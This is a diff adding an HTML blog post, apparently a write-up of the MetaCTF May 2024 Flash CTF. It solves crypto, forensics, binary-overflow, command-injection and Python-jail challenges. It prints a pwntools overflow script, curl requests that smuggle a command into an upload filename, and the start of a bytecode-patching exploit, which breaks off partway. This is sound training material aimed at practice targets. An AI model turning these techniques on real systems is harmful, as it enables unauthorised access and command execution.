@@ -1,0 +1,232 @@
+<!doctype html><html data-theme=dark lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#9a9996 name=theme-color><meta content=#20c20e media=(prefers-color-scheme:dark) name=theme-color><title>️🏴 MetaCTF May 2024 Flash CTF - psypherpunk::blog</title><link href=https://blog.psypherpunk.io/blog/metactf-may-2024-flash-ctf/ rel=canonical><link href=https://blog.psypherpunk.io/favicon.png rel=icon type=image/png><link href=https://blog.psypherpunk.io/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><link title="psypherpunk::blog - RSS Feed" href=https://blog.psypherpunk.io/rss.xml rel=alternate type=application/rss+xml><link title="psypherpunk::blog - Atom Feed" href=https://blog.psypherpunk.io/atom.xml rel=alternate type=application/atom+xml><style>:root{--accent-color:#6f8396}[data-theme=dark]{--accent-color:#20c20e}@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--accent-color:#20c20e}}</style><link href=https://blog.psypherpunk.io/style.css rel=stylesheet><script defer src=https://blog.psypherpunk.io/closable.js></script><meta content=psypherpunk::blog property=og:site_name><meta content="️🏴 MetaCTF May 2024 Flash CTF - psypherpunk::blog" property=og:title><meta content=https://blog.psypherpunk.io/blog/metactf-may-2024-flash-ctf/ property=og:url><meta content="A monthly mini CTF competition organized by MetaCTF and Antisyphon." property=og:description><meta content=https://blog.psypherpunk.io/card.png property=og:image><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main-content tabindex=0> Skip to Main Content </a><ul><li id=home><a href=https://blog.psypherpunk.io> <i class=icon></i>psypherpunk::blog</a><li class=divider><li><a href=https://blog.psypherpunk.io/blog/>Blog</a><li id=feed><details class=closable><summary class=circle title=Feed><i class=icon></i></summary> <ul><li><a href=https://blog.psypherpunk.io/rss.xml>RSS</a><li><a href=https://blog.psypherpunk.io/atom.xml>Atom</a></ul></details></ul></nav></header><main id=main-content><article><div id=heading><p><small> <time datetime=" 2024-05-24T00:00:00+00:00">Published on May 24, 2024</time></small><h1>️🏴 MetaCTF May 2024 Flash CTF</h1><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/tags/ctf/>ctf</a></ul><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/categories/ctf/>ctf</a></ul></div><div id=buttons-container><a title="Go to Top" href=#top id=go-to-top><i class=icon></i></a></div><blockquote><p><em>A monthly mini CTF competition organized by MetaCTF with support from Antisyphon Training and TCM Security. There will be 5 challenges and you will have 2 hours to solve as many as you can. This is a beginner-friendly CTF.</em></blockquote><p>Details here: <a href=https://app.metactf.com/join/may2024>https://app.metactf.com/join/may2024</a>.</p><span id=continue-reading></span><h2 id=a-tale-of-two-ciphertexts>A Tale of Two Ciphertexts</h2><blockquote><p><em>We intercepted some communications by an enemy cyber actor, and we believe it’s possible to break their encryption scheme. We know they’re using some form of a one-time pad, but fatally, they’re reusing the key across all their messages. We know the group likes classical books, with one of the actors recently being into Charles Dickens, but we don’t have much else to go off of.</em><p><em>Please break <a href=https://metaproblems.com/8dbd10de87c1b9b482531ac26e0b63ef/ciphertexts.txt>these communications</a> to get the password they’ve sent each other!</em><p><em><a href=https://toolbox.lotusfa.com/crib_drag/>This tool</a> (or a similar one) might come in handy.</em></blockquote><p>I definitely need to read up on “Crib Dragging” a little more as the behaviour isn’t <em>quite</em> what I’d expect.<p>That said, the <a href=https://toolbox.lotusfa.com/crib_drag/>suggested tool</a> correctly decrypts the two provided ciphertexts; taking a wild guess at the Dickens work in question being <em>A Tale of Two Cities</em> turned out to be correct.<p>Grabbing the first two paragraphs of that book, courtesy of <a href=https://www.gutenberg.org/cache/epub/98/pg98-images.html>Project Gutenberg</a>, reveals two results:<blockquote><p><em>Great idea to use this XOR key to encrypt all of our communications, now it’s impossible to know what we’re talking about! I can tell you any secret in the world but since the XOR key is longer than any of our encrypted messages, it must be impossible to break, right? I do know one of my cybersecurity friends was telling me something about key reuse, but I’m sure that it’s fine. Anyway, let’s get to why I encrypt Ú=u!o:v;’</em><p><em>~cw hhCtby7|1zæ this message in the first place. I’ll be sending you a zip file with our evil plans soon, it’s super critical that no one reads the contents, so I thought it would be wise to send the password separately. The password is MetaCTF{cr1b_dr4gg1ng_7h3_b00k_c1ph3r}. I’ll reach back out to you soon! PS: I sent the start of that book in the other message for you PPS: Oh and I couldn’t forget to put one of my favorite quotes: “Who controls the past controls the future. Who controls the present controls the past“yg=äT BM¾¨</em></blockquote><p>Quite why each is suffixed/prefixed with garbage characters is some reading for another day.<h2 id=filesystem-folly>Filesystem Folly</h2><blockquote><p><em>We captured <a href=https://metaproblems.com/8dbd10de87c1b9b482531ac26e0b63ef/filesystem_folly.pcap>network traffic</a> of someone connecting to a file share on a server and writing to a few files.</em><p><em>The flag is in the <code>flag.png</code> file. Find it!</em><p><em>Hint: see if you can isolate the RPC requests that are responsible for writing files to the file system, and pull out the payload of the one that writes <code>flag.png</code>. <em>Copy Bytes as Raw Binary</em> might be helpful, but there are other valid approaches too.</em></blockquote><p>The provided PCAP file appears to be NFS traffic; opening it in Wireshark:<ol><li>add a filter for <code>nfs</code> to strip some of the extraneous packets.<li>there’s an <code>OPEN DH: 0x49e23f3e/flag.png</code> entry which is the target.<li>the <code>Data</code> part of that packet starts with <code>PNG</code> which is promising.</ol><p>Courtesy of Wireshark’s <em>Reassembled TCP</em> and <em>Copy…As Raw Binary</em> features, it’s possible to simply copy these data and paste the into a file-manager (Dolphin, in my case):<p><img alt=flag.png src=/img/may-2024-flag.png><h2 id=impossible-login>Impossible Login</h2><blockquote><p><em>Making a cool MetaCTF MMO-RPG, so I wrote a very fast <del>backdoor</del> backend login server. I made sure no one can login as root.</em><p><em><code>nc host5.metaproblems.com 5045</code></em><p><em>Grab the binary <a href=https://metaproblems.com/8dbd10de87c1b9b482531ac26e0b63ef/logmein>here</a>!</em></blockquote><p>Looking at the binary in <a href=https://hex-rays.com/ida-free/>IDA</a>, all the usernames/passwords are visible, including that for <code>root</code>: <code>cant_guess_this</code>.<p>However, it explicitly checks for a username of <code>root</code> and forbids authentication:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> nc host5.metaproblems.com 5045
+</span><span style=color:#bf616a>Username:</span><span> root
+</span><span style=color:#bf616a>Root</span><span> Login is NOT Allowed from this service
+</span></code></pre><p>There’s a combination of a buffer-overflow via the use of <code>scanf()</code> in the <code>main()</code> function:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>int </span><span style=color:#8fa1b3>main</span><span>(</span><span style=color:#b48ead>unsigned long </span><span style=color:#bf616a>a0</span><span>, </span><span style=color:#b48ead>unsigned long </span><span style=color:#bf616a>a1</span><span>)
+</span><span>{
+</span><span>    </span><span style=color:#b48ead>unsigned long</span><span> v0;  </span><span style=color:#65737e>// [bp-0x68]
+</span><span>    </span><span style=color:#b48ead>unsigned int</span><span> v1;  </span><span style=color:#65737e>// [bp-0x5c]
+</span><span>    </span><span style=color:#b48ead>unsigned int</span><span> v2;  </span><span style=color:#65737e>// [bp-0x4c]
+</span><span>    </span><span style=color:#b48ead>char</span><span> v3;  </span><span style=color:#65737e>// [bp-0x48]
+</span><span>    </span><span style=color:#b48ead>char</span><span> v4;  </span><span style=color:#65737e>// [bp-0x28]
+</span><span>
+</span><span>    v1 = a0;
+</span><span>    v0 = a1;
+</span><span>    </span><span style=color:#bf616a>setup</span><span>();
+</span><span>    </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#a3be8c>Username: </span><span>");
+</span><span>    </span><span style=color:#bf616a>__isoc99_scanf</span><span>("</span><span style=color:#d08770>%s</span><span>", (</span><span style=color:#b48ead>unsigned int</span><span>)&v4);
+</span><span>    </span><span style=color:#96b5b4>getchar</span><span>();
+</span><span>    </span><span style=color:#b48ead>if </span><span>(!</span><span style=color:#96b5b4>strncmp</span><span>(&v4, "</span><span style=color:#a3be8c>root</span><span>", </span><span style=color:#d08770>4</span><span>))
+</span><span>    {
+</span><span>        </span><span style=color:#96b5b4>puts</span><span>("</span><span style=color:#a3be8c>Root Login is NOT Allowed from this service</span><span>");
+</span><span>        </span><span style=color:#b48ead>return </span><span style=color:#d08770>1</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#a3be8c>Password: </span><span>");
+</span><span>    </span><span style=color:#bf616a>__isoc99_scanf</span><span>("</span><span style=color:#d08770>%s</span><span>", (</span><span style=color:#b48ead>unsigned int</span><span>)&v3);
+</span><span>    </span><span style=color:#96b5b4>getchar</span><span>();
+</span><span>    v2 = </span><span style=color:#bf616a>login</span><span>(&v4, </span><span style=color:#96b5b4>strlen</span><span>(&v4), &v3);
+</span><span>    </span><span style=color:#b48ead>return</span><span> v2;
+</span><span>}
+</span></code></pre><p>…and an invalid <code>strncmp()</code> use in the <code>login()</code> function:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>int </span><span style=color:#8fa1b3>login</span><span>(</span><span style=color:#b48ead>unsigned long </span><span style=color:#bf616a>a0</span><span>, </span><span style=color:#b48ead>unsigned long </span><span style=color:#bf616a>a1</span><span>, </span><span style=color:#b48ead>char </span><span>*</span><span style=color:#bf616a>a2</span><span>)
+</span><span>{
+</span><span>    </span><span style=color:#b48ead>unsigned int</span><span> v0;  </span><span style=color:#65737e>// [bp-0x1c]
+</span><span>    </span><span style=color:#b48ead>char </span><span>*v1;  </span><span style=color:#65737e>// [bp-0x18]
+</span><span>    </span><span style=color:#b48ead>char </span><span>*v2;  </span><span style=color:#65737e>// [bp-0x10]
+</span><span>
+</span><span>    v0 = </span><span style=color:#d08770>0</span><span>;
+</span><span>    </span><span style=color:#b48ead>while </span><span>(</span><span style=color:#d08770>true</span><span>)
+</span><span>    {
+</span><span>        </span><span style=color:#b48ead>if </span><span>(v0 > </span><span style=color:#d08770>23</span><span>)
+</span><span>        {
+</span><span>            </span><span style=color:#96b5b4>puts</span><span>("</span><span style=color:#a3be8c>Sorry, Username and Password combination not found</span><span>");
+</span><span>            </span><span style=color:#b48ead>return </span><span style=color:#d08770>1</span><span>;
+</span><span>        }
+</span><span>        v1 = *((</span><span style=color:#b48ead>long long </span><span>*)&(&creds)[</span><span style=color:#d08770>16 </span><span>* v0]);
+</span><span>        v2 = *((</span><span style=color:#b48ead>long long </span><span>*)&(&creds)[</span><span style=color:#d08770>8 </span><span>+ </span><span style=color:#d08770>16 </span><span>* v0]);
+</span><span>        </span><span style=color:#b48ead>if </span><span>(!</span><span style=color:#96b5b4>strncmp</span><span>(v1, a0, </span><span style=color:#96b5b4>strlen</span><span>(v1)))
+</span><span>            </span><span style=color:#b48ead>break</span><span>;
+</span><span>        v0 += </span><span style=color:#d08770>1</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#b48ead>if </span><span>(</span><span style=color:#96b5b4>strncmp</span><span>(v2, a2, </span><span style=color:#96b5b4>strlen</span><span>(v2)))
+</span><span>    {
+</span><span>        </span><span style=color:#96b5b4>puts</span><span>("</span><span style=color:#a3be8c>Sorry, Username and Password combination not found</span><span>");
+</span><span>        </span><span style=color:#b48ead>return </span><span style=color:#d08770>1</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#bf616a>motd</span><span>(a0, (</span><span style=color:#b48ead>unsigned int</span><span>)a1);
+</span><span>    </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>;
+</span><span>}
+</span></code></pre><p>The former can be used to overflow the password variable, overwriting the username variable. The latter ensures that as long as the password <em>starts</em> with the right value, it will be considered valid (effectively making this a <a href=https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use>TOCTOU</a> bug as the username initially entered is ignored during the authentication check).<p>Not being quite sure how much to overflow, I tried:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>from </span><span>pwn </span><span style=color:#b48ead>import </span><span>process
+</span><span>
+</span><span>
+</span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>1</span><span>, </span><span style=color:#d08770>32</span><span>):
+</span><span>    r = </span><span style=color:#bf616a>process</span><span>("</span><span style=color:#a3be8c>./logmein</span><span>")
+</span><span>
+</span><span>    r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Username: </span><span>")
+</span><span>    r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>MetaCTF</span><span>")
+</span><span>
+</span><span>    r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Password: </span><span>")
+</span><span>    payload = </span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>cant_guess_this</span><span>" + (</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>X</span><span>" * i) + </span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>root</span><span>"
+</span><span>    </span><span style=color:#96b5b4>print</span><span>(payload.</span><span style=color:#bf616a>decode</span><span>())
+</span><span>    r.</span><span style=color:#bf616a>sendline</span><span>(payload)
+</span><span>
+</span><span>    result = r.</span><span style=color:#bf616a>readline</span><span>().</span><span style=color:#bf616a>decode</span><span>()
+</span><span>    </span><span style=color:#b48ead>if </span><span>"</span><span style=color:#a3be8c>Welcome</span><span>" in result:
+</span><span>        </span><span style=color:#96b5b4>print</span><span>(r.</span><span style=color:#bf616a>readline</span><span>().</span><span style=color:#bf616a>decode</span><span>())
+</span><span>        </span><span style=color:#bf616a>exit</span><span>()
+</span><span>
+</span><span>    r.</span><span style=color:#bf616a>close</span><span>()
+</span></code></pre><p>…which demonstrates the requisite amount:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> nc host5.metaproblems.com 5045
+</span><span style=color:#bf616a>Username:</span><span> metactf
+</span><span style=color:#bf616a>Password:</span><span> cant_guess_thisXXXXXXXXXXXXXXXXXroot
+</span><span style=color:#bf616a>Welcome</span><span> Back root
+</span><span style=color:#bf616a>Here</span><span> is your personalize flag: MetaCTF{P@ssw0rDS_r_0pti0n4l}
+</span></code></pre><h2 id=conversion-perversion>Conversion Perversion</h2><blockquote><p><em>I’m tired of all these file formats! I’m sick of using random websites to convert files, so I made my own. I’m not quite sure what I’m doing, and I’m certainly not a web designer, but at least the site seems to work!</em><p><em>Try out <a href=http://fileconverter.mctf.io:7000/>our service</a> (<a href=http://44.204.58.76:7000/>alt link</a>) and let us know what you think. Also feel free to <a href=https://metaproblems.com/8dbd10de87c1b9b482531ac26e0b63ef/ConversionPerversion.zip>audit my source code</a>. (I can use the help!)</em><p><em>Please be kind to the server, file conversion is not a light process… ^^and do not use automated scanning tools against the web server.^^ They will not help. If your IP sends too many requests, you might see error 503.</em></blockquote><p>There’s a <code>notes.txt</code> file in the provided ZIP:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> cat ConversionPerversion/notes.txt
+</span><span style=color:#bf616a>Notes</span><span> to self:
+</span><span style=color:#bf616a>I</span><span> updated all my tools, pandoc looks like it had a vulnerability maybe in the old version, but it seems patched now!
+</span><span style=color:#bf616a>Also,</span><span> I know I had some important file on the remote server, but I can'</span><span style=color:#a3be8c>t remember what I named it...
+</span></code></pre><p>Which, somewhat obtusely, is hinting at a vulnerability…<em>somewhere</em>. The challenge, somewhat curiously, is using a <code>.bat</code> file which might be a push towards the recent, ridiculously-name <em>BatBadBut</em>, a.k.a. <a href="https://www.cve.org/CVERecord?id=CVE-2024-24576">CVE-2024-24576</a>.<p>The <code>.bat</code> file is in turn using PowerShell to call <code>pandoc</code> but the use of <code>cmd.exe</code> should—if the above CVE holds true—allow arbitrary commands to be injected into requests:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> curl http://fileconverter.mctf.io:7000/ \
+</span><span>∙</span><span style=color:#bf616a>    --form </span><span>'</span><span style=color:#a3be8c>file=@/dev/null;filename="|dir>uploads/metactf.txt";type=text/plain</span><span>' \
+</span><span>∙</span><span style=color:#bf616a>    --form </span><span>'</span><span style=color:#a3be8c>output_format=json</span><span>'
+</span><span>&lt;!doctype </span><span style=color:#bf616a>html</span><span>>
+</span><span>&lt;html </span><span style=color:#bf616a>lang</span><span>=</span><span style=color:#a3be8c>en</span><span>>
+</span><span>&lt;title></span><span style=color:#d08770>404 </span><span style=color:#bf616a>Not</span><span> Found&lt;/title>
+</span><span>&lt;h1>Not </span><span style=color:#bf616a>Found</span><span>&lt;/h1>
+</span><span>&lt;p>The </span><span style=color:#bf616a>requested</span><span> URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p>
+</span></code></pre><p>Here, <code>dir</code> is used as it’s not actually clear where the flag is. Again, using the service to convert that new JSON file back to something legible:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> curl http://fileconverter.mctf.io:7000/ \
+</span><span>∙</span><span style=color:#bf616a>    --form </span><span>'</span><span style=color:#a3be8c>file=@/dev/null;filename=metactf.json;type=text/plain</span><span>' \
+</span><span>∙</span><span style=color:#bf616a>    --form </span><span>'</span><span style=color:#a3be8c>output_format=markdown</span><span>'
+</span><span style=color:#bf616a>Volume</span><span> in drive C has no label. Volume Serial Number is 8AA1-82A4
+</span><span>
+</span><span style=color:#bf616a>Directory</span><span> of C:`</span><span style=color:#96b5b4>\C</span><span style=color:#bf616a>hallenge</span><span>`{=tex}
+</span><span>
+</span><span style=color:#bf616a>05/24/2024</span><span> 05:50 PM
+</span><span>&lt;DIR>
+</span><span style=color:#96b5b4>.</span><span> 05/23/2024 11:39 PM 4,463 app.py 05/25/2024 11:37 AM 130,733
+</span><span style=color:#bf616a>conversion.log</span><span> 05/24/2024 12:18 AM 624 convert.bat 05/25/2024 11:34 AM
+</span><span>&lt;DIR>
+</span><span style=color:#bf616a>downloads</span><span> 05/23/2024 11:40 PM 45
+</span><span style=color:#bf616a>MetaCTF{b4t_m4y_b3_b4d_bu7_c4nt_b3_c0nv3r73d</span><span>}</span><span style=color:#bf616a>.txt</span><span> 05/24/2024 05:50 PM
+</span><span style=color:#bf616a>651</span><span> onetxt 05/23/2024 11:59 PM 39 start.bat 05/25/2024 11:32 AM 9
+</span><span style=color:#bf616a>started.txt</span><span> 05/23/2024 09:57 PM
+</span><span>&lt;DIR>
+</span><span style=color:#bf616a>templates</span><span> 05/25/2024 11:35 AM
+</span><span>&lt;DIR>
+</span><span>
+</span><span style=color:#bf616a>uploads</span><span> 7 File(s) </span><span style=color:#bf616a>136,564</span><span> bytes 4 Dir(s) </span><span style=color:#bf616a>13,541,421,056</span><span> bytes free
+</span></code></pre><h2 id=wizard-jail>Wizard Jail</h2><blockquote><p><em>You’ve been locked in a secure wizard jail, but the overworked guards forgot to take your magic wand away! Can you break out of your cell?</em><p><em>Download the <a href=https://metaproblems.com/7395adf5ffe80e08c9bfaab6df5c45f5/wizardjail.zip>jail plans</a> here.</em><p><em>Connect to the challenge via <code>nc host5.metaproblems.com 7650</code></em></blockquote><p>Oh no, it’s another <code>__code__</code> related Python challenge!<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>❯ python3 jail.py
+</span><span>Break out of the jail!
+</span><span>
+</span><span>Choose an option:
+</span><span>  </span><span style=color:#d08770>1</span><span style=color:#2b303b;background-color:#bf616a>)</span><span> Use magic wand
+</span><span>  </span><span style=color:#d08770>2</span><span style=color:#2b303b;background-color:#bf616a>)</span><span> Mend magic wand
+</span><span>
+</span><span>Enter </span><span style=color:#d08770>1 </span><span>or </span><span style=color:#d08770>2</span><span>:
+</span></code></pre><p>Users are given two options; firstly cast a spell with the wand, taking arbitrary input which is passed through <code>eval()</code> (but only after a <em>lot</em> of coercing):<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>magic_wand</span><span>(</span><span style=color:#bf616a>spell</span><span>):
+</span><span>    spell = "</span><span style=color:#a3be8c>~</span><span>" + spell[::-</span><span style=color:#d08770>1</span><span>]
+</span><span>    spell = spell[</span><span style=color:#d08770>5</span><span>:</span><span style=color:#d08770>10</span><span>:] + "</span><span style=color:#a3be8c>~</span><span>" + spell[:</span><span style=color:#d08770>5</span><span>:]
+</span><span>    spell += "</span><span style=color:#a3be8c>~</span><span>"
+</span><span>    </span><span style=color:#b48ead>return </span><span style=color:#96b5b4>eval</span><span>(spell + "</span><span style=color:#a3be8c>]</span><span>")
+</span></code></pre><p>Or secondly, up to 5 attempts to modify the <code>co_code</code> value of <code>magic_wand</code>, taking an integer position and value, effectively allowing the function’s bytecode to be modified:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>mend</span><span>(</span><span style=color:#bf616a>magic_wand</span><span>, </span><span style=color:#bf616a>location</span><span>, </span><span style=color:#bf616a>charm</span><span>):
+</span><span>    co = magic_wand.__code__
+</span><span>    magic_wand.__code__ = </span><span style=color:#bf616a>CodeType</span><span>(
+</span><span>        co.co_argcount,
+</span><span>        co.co_posonlyargcount,
+</span><span>        co.co_kwonlyargcount,
+</span><span>        co.co_nlocals,
+</span><span>        co.co_stacksize,
+</span><span>        co.co_flags,
+</span><span>        co.co_code[:location] + charm + co.co_code[location + </span><span style=color:#d08770>1 </span><span>:],
+</span><span>        co.co_consts,
+</span><span>        co.co_names,
+</span><span>        co.co_varnames,
+</span><span>        co.co_filename,
+</span><span>        co.co_name,
+</span><span>        co.co_qualname,
+</span><span>        co.co_firstlineno,
+</span><span>        co.co_linetable,
+</span><span>        co.co_exceptiontable,
+</span><span>        co.co_freevars,
+</span><span>        co.co_cellvars,
+</span><span>    )
+</span><span>    </span><span style=color:#b48ead>return </span><span>magic_wand
+</span></code></pre><p>Looking at the bytecode for <code>magic_wand</code>, courtesy of <code>dis</code>:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> </span><span style=color:#b48ead>from </span><span>jail </span><span style=color:#b48ead>import </span><span>magic_wand
+</span><span>>>> </span><span style=color:#b48ead>import </span><span>dis
+</span><span>>>> dis.</span><span style=color:#bf616a>dis</span><span>(magic_wand)
+</span><span>  </span><span style=color:#d08770>4           0 </span><span style=color:#bf616a>RESUME                   </span><span style=color:#d08770>0
+</span><span>
+</span><span>  </span><span style=color:#d08770>5           2 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>1 </span><span>('</span><span style=color:#a3be8c>~</span><span>')
+</span><span>              </span><span style=color:#d08770>4 </span><span style=color:#bf616a>LOAD_FAST                </span><span style=color:#d08770>0 </span><span>(spell)
+</span><span>              </span><span style=color:#d08770>6 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>0 </span><span>(</span><span style=color:#d08770>None</span><span>)
+</span><span>              </span><span style=color:#d08770>8 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>0 </span><span>(</span><span style=color:#d08770>None</span><span>)
+</span><span>             </span><span style=color:#d08770>10 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>2 </span><span>(-</span><span style=color:#d08770>1</span><span>)
+</span><span>             </span><span style=color:#d08770>12 </span><span style=color:#bf616a>BUILD_SLICE              </span><span style=color:#d08770>3
+</span><span>             </span><span style=color:#d08770>14 </span><span style=color:#bf616a>BINARY_SUBSCR
+</span><span>             </span><span style=color:#d08770>24 </span><span style=color:#bf616a>BINARY_OP                </span><span style=color:#d08770>0 </span><span>(+)
+</span><span>             </span><span style=color:#d08770>28 </span><span style=color:#bf616a>STORE_FAST               </span><span style=color:#d08770>0 </span><span>(spell)
+</span><span>
+</span><span>  </span><span style=color:#d08770>6          30 </span><span style=color:#bf616a>LOAD_FAST                </span><span style=color:#d08770>0 </span><span>(spell)
+</span><span>             </span><span style=color:#d08770>32 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>3 </span><span>(</span><span style=color:#d08770>5</span><span>)
+</span><span>             </span><span style=color:#d08770>34 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>4 </span><span>(</span><span style=color:#d08770>10</span><span>)
+</span><span>             </span><span style=color:#d08770>36 </span><span style=color:#bf616a>BUILD_SLICE              </span><span style=color:#d08770>2
+</span><span>             </span><span style=color:#d08770>38 </span><span style=color:#bf616a>BINARY_SUBSCR
+</span><span>             </span><span style=color:#d08770>48 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>1 </span><span>('</span><span style=color:#a3be8c>~</span><span>')
+</span><span>             </span><span style=color:#d08770>50 </span><span style=color:#bf616a>BINARY_OP                </span><span style=color:#d08770>0 </span><span>(+)
+</span><span>             </span><span style=color:#d08770>54 </span><span style=color:#bf616a>LOAD_FAST                </span><span style=color:#d08770>0 </span><span>(spell)
+</span><span>             </span><span style=color:#d08770>56 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>0 </span><span>(</span><span style=color:#d08770>None</span><span>)
+</span><span>             </span><span style=color:#d08770>58 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>3 </span><span>(</span><span style=color:#d08770>5</span><span>)
+</span><span>             </span><span style=color:#d08770>60 </span><span style=color:#bf616a>BUILD_SLICE              </span><span style=color:#d08770>2
+</span><span>             </span><span style=color:#d08770>62 </span><span style=color:#bf616a>BINARY_SUBSCR
+</span><span>             </span><span style=color:#d08770>72 </span><span style=color:#bf616a>BINARY_OP                </span><span style=color:#d08770>0 </span><span>(+)
+</span><span>             </span><span style=color:#d08770>76 </span><span style=color:#bf616a>STORE_FAST               </span><span style=color:#d08770>0 </span><span>(spell)
+</span><span>
+</span><span>  </span><span style=color:#d08770>7          78 </span><span style=color:#bf616a>LOAD_FAST                </span><span style=color:#d08770>0 </span><span>(spell)
+</span><span>             </span><span style=color:#d08770>80 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>1 </span><span>('</span><span style=color:#a3be8c>~</span><span>')
+</span><span>             </span><span style=color:#d08770>82 </span><span style=color:#bf616a>BINARY_OP               </span><span style=color:#d08770>13 </span><span>(+=)
+</span><span>             </span><span style=color:#d08770>86 </span><span style=color:#bf616a>STORE_FAST               </span><span style=color:#d08770>0 </span><span>(spell)
+</span><span>
+</span><span>  </span><span style=color:#d08770>8          88 </span><span style=color:#bf616a>LOAD_GLOBAL              </span><span style=color:#d08770>1 </span><span>(</span><span style=color:#bf616a>NULL </span><span>+ </span><span style=color:#96b5b4>eval</span><span>)
+</span><span>            </span><span style=color:#d08770>100 </span><span style=color:#bf616a>LOAD_FAST                </span><span style=color:#d08770>0 </span><span>(spell)
+</span><span>            </span><span style=color:#d08770>102 </span><span style=color:#bf616a>LOAD_CONST               </span><span style=color:#d08770>5 </span><span>('</span><span style=color:#a3be8c>]</span><span>')
+</span><span>            </span><span style=color:#d08770>104 </span><span style=color:#bf616a>BINARY_OP                </span><span style=color:#d08770>0 </span><span>(+)
+</span><span>            </span><span style=color:#d08770>108 </span><span style=color:#bf616a>PRECALL                  </span><span style=color:#d08770>1
+</span><span>            </span><span style=color:#d08770>112 </span><span style=color:#bf616a>CALL                     </span><span style=color:#d08770>1
+</span><span>            </span><span style=color:#d08770>122 </span><span style=color:#bf616a>RETURN_VALUE
+</span></code></pre><p>See the docs. for <a href=https://docs.python.org/3.12/library/dis.html#python-bytecode-instructions><code>dis</code></a> for a breakdown of each instruction.<p>After some attempt to try and determine how to rewrite <code>open("/flag.txt").read()#</code> (the trailing <code>#</code> is there to comment-out the immovable <code>]</code> passed into the <code>eval()</code>) such that it comes <em>out</em> of <code>magic_wand</code> correctly and failing miserably, the quickest way seems to be to simply <a href=https://docs.python.org/3.12/library/dis.html#opcode-JUMP_FORWARD><code>JUMP_FORWARD</code></a>, bypassing all that silliness entirely. Specifically, according to the above, it needs to jump 29 bytes:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>dis
+</span><span>
+</span><span style=color:#b48ead>from </span><span>pwn </span><span style=color:#b48ead>import </span><span>process, remote
+</span><span>
+</span><span>
+</span><span>r = </span><span style=color:#bf616a>remote</span><span>("</span><span style=color:#a3be8c>host5.metaproblems.com</span><span>", </span><span style=color:#d08770>7650</span><span>)
+</span><span>
+</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Enter 1 or 2: </span><span>")
+</span><span>r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>2</span><span>")
+</span><span>
+</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>you'd like to mend (an integer): </span><span>")
+</span><span>r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>2</span><span>")
+</span><span>
